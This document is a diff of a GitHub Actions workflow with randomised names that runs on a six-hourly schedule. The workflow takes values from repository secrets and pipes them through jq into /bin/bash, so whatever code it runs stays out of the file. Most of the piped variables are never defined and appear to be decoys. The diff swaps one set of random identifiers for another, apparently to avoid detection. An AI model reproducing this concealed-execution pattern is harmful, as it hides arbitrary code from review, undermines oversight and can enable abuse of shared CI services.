@@ -1,29 +1,25 @@
 name: dongxinchang5647
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 4/6 * * *'
+    - cron: '6 4/6 * * *'
 
-jobs:  # 11661
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dongxinchang5647
         env:
-          ftkw3279: ${{ secrets.ftkw3279 }}
+          yxf9610: ${{ secrets.yxf9610 }}
         run: |
-          echo $ftkw3279 | jq -r .iimmx533 | /bin/bash
-          echo $r17 | jq -r .qfrd37 | /bin/bash
-          echo $ln6851 | jq -r .c3053 | /bin/bash
-          echo $xynxv9 | jq -r .cr52435 | /bin/bash
-          echo $e790 | jq -r .yowl123 | /bin/bash
-          echo $qecoe40 | jq -r .d904 | /bin/bash
-          echo $eqlt7 | jq -r .l4 | /bin/bash
-          echo $rrqyb6 | jq -r .sbzi6 | /bin/bash
-          echo $k6057 | jq -r .e59 | /bin/bash
-          echo $rby398 | jq -r .vnjhu4 | /bin/bash
-          echo $gzn4 | jq -r .ntxj0484 | /bin/bash
-          echo $nm46543 | jq -r .ij9 | /bin/bash
+          echo $yxf9610 | jq -r .gz26605 | /bin/bash
+          echo $l4500 | jq -r .jsftj7 | /bin/bash
+          echo $yhybk8244 | jq -r .ojn0 | /bin/bash
+          echo $ad122 | jq -r .xpt33179 | /bin/bash
+          echo $k89160 | jq -r .bsqm52 | /bin/bash
+          echo $arqv20315 | jq -r .h2436 | /bin/bash
+          echo $e9250 | jq -r .fzujl3 | /bin/bash
+          echo $z36401 | jq -r .obr0519 | /bin/bash
 
